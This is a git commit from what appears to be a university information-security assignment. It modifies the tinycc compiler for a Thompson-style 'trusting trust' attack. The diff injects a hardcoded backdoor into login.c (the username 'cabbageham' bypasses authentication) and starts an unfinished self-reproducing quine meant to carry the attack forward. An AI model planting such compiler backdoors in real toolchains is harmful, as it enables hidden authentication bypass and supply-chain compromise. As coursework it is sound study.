c2968e41766dd874e897363125417bc2b1834daf
N Hernandez <nhernandez19885@gmail.com>
2024-04-16 14:05:55 -0400

    setting up the quine portion

--- README.md
+++ README.md
@@ -10,3 +10,11 @@ This repo is for the coding assignment of info-sec which dealing with a bugged c
 6. make && sudo make install
 7. tcc -o login login.c (or any c program)
 should see the test print from the changes in step 1
+
+---------------------
+
+1. modify libtcc so that as it writes to the temp file DURING COMPILER ATTACK, it defines char quine_output[] = ... where ... equals the characters of quine_output DEFINED WITHIN ITSELF AKA LIBTCC.C
+(note: at first this wont compile, wait until step 4)
+2. put final attack into attack.c
+3. ./quine < attack.c > attack_as_string.c
+4. put contents of attack_as_string.c into libtcc.c like char quine_output[] = ...
--- tinycc-dirty/attack.c
+++ tinycc-dirty/attack.c
@@ -1,4 +1,4 @@
-  if(!strcmp(str, "login.c")) {
+ if(!strcmp(str, "login.c")) {
         printf("testing\n");
         char login_line[] = "if (!strcmp(username, \"cabbageham\"))return 0;";
         FILE *source = fopen(str, "r");
@@ -25,11 +25,20 @@
 		FILE *temp = fopen("temp.txt", "w");
         char target_line[] = "       variables, which may or may not have advantages */";
         char attack_line[] = "printf(\"THIS IS A TEST\\n\");";
-		char buffer[50000];
+    	char buffer[50000];
+        char constructed_quine[5000];
 		while (fgets(buffer, 50000, source)) {
 		    if (strstr(buffer, target_line)) {
+                //TODO reconstruct quine considering escape characters, insert into temp_buffer
+                char temp_buffer[] = "hiiii";
+
+                strcpy(constructed_quine, "char* quine = \"");
+                strcat(constructed_quine, temp_buffer);
+                strcat(constructed_quine, "\";\n");
+		        fputs(constructed_quine, temp);
+
 		        fputs(buffer, temp);
-                fputs(attack_line, temp);
+                fputs(quine, temp);                
             } 
             else {
                 fputs(buffer, temp);
